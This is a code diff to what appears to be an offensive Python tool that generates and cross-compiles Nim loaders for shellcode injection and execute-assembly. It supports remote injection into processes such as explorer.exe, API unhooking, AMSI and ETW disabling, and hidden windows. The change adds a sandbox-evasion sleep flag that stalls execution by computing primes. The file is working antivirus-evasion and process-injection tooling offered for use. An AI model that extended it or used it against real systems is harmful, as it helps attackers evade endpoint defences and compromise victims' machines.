@@ -201,7 +201,7 @@ def generateSource_RemoteShinject(fileName, cryptedInput, cryptedCoat, cryptIV, 
 
     return outFilename
 
-def compileNim(fileName, fileType, executionMode, localInject, hideApp, unhookApis, disableAmsi, disableEtw, x64, verbose, debug):
+def compileNim(fileName, fileType, executionMode, localInject, hideApp, unhookApis, sleep, disableAmsi, disableEtw, x64, verbose, debug):
     # Compile the generated Nim file for Windows (cross-compile if run from linux)
     # Compilation flags are focused on stripping and optimizing the output binary for size
     if x64:
@@ -216,6 +216,9 @@ def compileNim(fileName, fileType, executionMode, localInject, hideApp, unhookAp
 
     try:
         compileCommand = f"nim c -d:danger -d:strip -d:release --hints:off --warnings:off --opt:size --passc=-flto --passl=-flto --maxLoopIterationsVM:100000000 --app:{gui} --cpu={cpu}"
+
+        if sleep:
+            compileCommand = compileCommand + " -d:calcPrimes"
 
         if unhookApis:
             compileCommand = compileCommand + " -d:patchApiCalls"
@@ -283,6 +286,7 @@ if __name__ == "__main__":
     injection.add_argument('-t', '--target', action='store', dest='injecttarget', default="explorer.exe", help='Remote thread targeted for remote process injection (default "explorer.exe", implies -r)')
     injection.add_argument('-E', '--existing', action='store_true', dest='existingprocess', default=False, help='Remote inject into existing process rather than a newly spawned one (default false, implies -r) (WARNING: VOLATILE)')
     optional.add_argument('-f', '--filetype', action='store', default="exe", dest='filetype', help='Filetype to compile ("exe" or "dll", default: "exe")')
+    optional.add_argument('-s', '--sleep', action='store_true', default=False, dest='sleep', help='Sleep for approx. 30 seconds by calculating primes')
     optional.add_argument('-32', '--32bit', action='store_false', default=True, dest='x64', help='Compile in 32-bit mode')
     optional.add_argument('-H', '--hideapp', action='store_true', default=False, dest='hideApp', help='Hide the app frontend (console output) of executable by compiling it in GUI mode')
     optional.add_argument('-nu', '--nounhook', action='store_false', default=True, dest='unhookApis', help='Do NOT unhook user-mode API hooks')
@@ -329,4 +333,4 @@ if __name__ == "__main__":
         raise SystemExit("ERROR: Argument 'executionmode' is not valid. Please specify either 'execute-assembly' or 'shinject'.")
 
     compileNim(sourceFile, args.filetype, args.executionmode, args.localinject, args.hideApp, args.unhookApis,
-        args.patchAmsi, args.disableEtw, args.x64, args.verbose, args.debug)
+        args.sleep, args.patchAmsi, args.disableEtw, args.x64, args.verbose, args.debug)
